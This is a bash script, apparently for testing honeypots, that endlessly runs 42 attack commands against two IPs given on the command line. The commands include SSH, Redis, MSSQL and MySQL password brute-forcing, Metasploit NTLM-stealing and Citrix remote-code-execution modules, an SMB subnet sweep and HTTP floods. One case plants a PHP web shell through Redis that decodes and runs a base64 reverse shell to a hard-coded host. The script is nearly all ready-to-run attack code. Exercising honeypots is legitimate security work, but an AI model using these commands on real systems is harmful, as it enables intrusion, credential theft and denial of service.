#!/bin/bash
# GPLv3 License
# Authors: pdolinic, GPT-4
# Info: 1. Add your Tooling into in the cases. 2. Adjust a) attack_count b) timeout c) sleep to your needs.

if [ "$#" -ne 2 ]; then
    echo "Usage: $0 <ip1> <ip2>"
    exit 1
fi

ip1=$1
ip2=$2

attack_command() {
    local ip=$1
    local cmd_num=$2

    case $cmd_num in
        1) echo "echo -e '------------ +++ Starting Attacks with: Cowrie +++  ------------ '" ;;
        2) echo "nmap -p 22 -sV $ip" ;;
        3) echo "python3 sshscan.py -t $ip" ;;
        4) echo "hydra -t 64 -I -L /usr/share/wordlists/SecLists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/SecLists/Passwords/2020-200_most_used_passwords.txt -s 22 $ip ssh" ;;
        5) echo "medusa -u /usr/share/wordlists/SecLists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/SecLists/Passwords/2020-200_most_used_passwords.txt -h $ip -M ssh -n 22" ;;
        6) echo "nmap -p 22 --script ssh-brute --script-args userdb=users.lst,passdb=pass.lst --script-args ssh-brute.timeout=4s $ip" ;;
        7) echo "echo -e '------------ +++ Redispot +++ ------------ '" ;;
        8) echo "nmap -p 6379 $ip --script redis-info" ;;
        9) echo "redis-benchmark -h $ip -p 6379 -t set,get -n 900000 -c 1000" ;;
        10) echo "hydra -t 64 -I -P /usr/share/wordlists/SecLists/Passwords/2020-200_most_used_passwords.txt $ip redis" ;;
        11) 
            echo 'tmpfile=$(mktemp) && cat > $tmpfile <<-EOF
set key value
get key
flushall
config get dir
config set dbfilename test.php
set test "<?php system('\''echo c2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC40OS4xOTEvODAgMD4mMQ== | base64 -d | bash'\''); ?>"
EOF
while IFS= read -r cmd; do echo -e "$cmd" | nc -vn -w 1 "'"$ip"'" 6379; sleep 2; done < $tmpfile
rm -f $tmpfile'
        ;;

        12) echo "echo -e '------------ +++ DIONAEA SMB +++ ------------ '" ;;
        13) echo "crackmapexec smb 10.77.15.0/24";;
        14) echo "nmap --script=smb2-security-mode.nse -p 445 10.77.15.0/24 -Pn --open";;
        15) echo "impacket-smbclient $ip";;
        16) echo "echo -e '------------ +++ DIONAEA MSSQL +++ ------------ '" ;;
        17) echo "nmap -p 1433 --script ms-sql-info $ip -d ";;
        18) echo "impacket-mssqlclient $ip -no-pass" ;;
        19) echo " impacket-mssqlinstance $ip" ;;
        20) echo " hydra -t 64 -I -L /usr/share/wordlists/SecLists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/SecLists/Passwords/2020-200_most_used_passwords.txt $ip mssql" ;;
        21) echo "msfconsole -x 'use auxiliary/scanner/mssql/mssql_login;set rhosts $ip; run;sleep 5;exit'" ;;
        22) echo "msfconsole -x 'use auxiliary/admin/mssql/mssql_ntlm_stealer;set rhosts $ip;run; sleep 5;exit'" ;;
        23) echo "echo -e '------------ +++ DIONAEA MYSQL +++ ------------ '" ;;
        24) echo "nmap --script mysql* -sV -p 3306 $ip";;
        25) echo "hydra -t 64 -I -L /usr/share/wordlists/SecLists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/SecLists/Passwords/2020-200_most_used_passwords.txt $ip mysql";;
        26) echo "msfconsole -x 'use auxiliary/scanner/mysql/mysql_login;set rhosts $ip; run; sleep 5; exit '";;
        27) echo "mysql -u username -ppassword -h $ip";;
        28) echo "echo -e '------------ +++ Elasticpot +++ ------------ '" ;;
        29) echo "curl -XGET 'http://$ip:9200/_cluster/health?pretty' #Cluster-Gesundheit" ;;
        30) echo "curl -XGET '$ip:9200/_nodes' #Knoten" ;;
        31) echo "curl -XGET "$ip:9200/_search?pretty_true" #Indices dumpen" ;;
        32) echo "nmap -p 9200 --script=default,vuln,version $ip";;
        33) echo "msfconsole -x 'use scanner/http/elasticsearch_traversal;set rhosts $ip; run; sleep 5; exit'" ;; 
        34) echo "echo -e '------------ +++ Snare & Tanner +++ ------------ '" ;;
        35) echo 'for i in $(seq 1 10000); do curl http://'$ip':80; done' ;;
        36) echo "siege $ip -c 255 -r 100000 -b -v" ;;
        37) echo "echo -e '------------ +++ Citrixpot +++ ------------ '" ;;
        38) echo "nmap -p 443 --script=vuln,default,version $ip" ;;
        39) echo "curl -k https://$ip/vpn/index.html" ;;
        40) echo "msfconsole -x 'use unix/webapp/citrix_access_gateway_exec; set rhosts $ip; set rport 443; run; sleep 5; exit;'" ;;
        41) echo "msfconsole -x 'use freebsd/http/citrix_dir_traversal_rce;set rhosts $ip;set ForceExploit true;set rport 443; set lhost eth1;set ssl true;run; sleep 5; exit;'";;
        42) echo "echo -e '------------ +++ Completed All Attacks +++ ------------ '" ;;

esac
}

announce_attack() {
    local attack=$1
    local ip=$2
    echo "Launching attack in 3 seconds on $ip: $attack"
    sleep 3
}

execute_attack() {
    local attack=$1
    local ip=$2
    timeout 15 bash -c "$attack"
}

random_ip() {
    local ip1=$1
    local ip2=$2
    if [ $((RANDOM % 2)) -eq 0 ]; then
        echo "$ip1"
    else
        echo "$ip2"
    fi
}

attack_count=42

while true; do
    for ((i=1; i<=attack_count; i++)); do
        attack_ip=$(random_ip $ip1 $ip2)
        attack_cmd=$(attack_command $attack_ip $i)
        
        announce_attack "$attack_cmd" $attack_ip
        execute_attack "$attack_cmd" $attack_ip
        
        sleep 5
    done
done
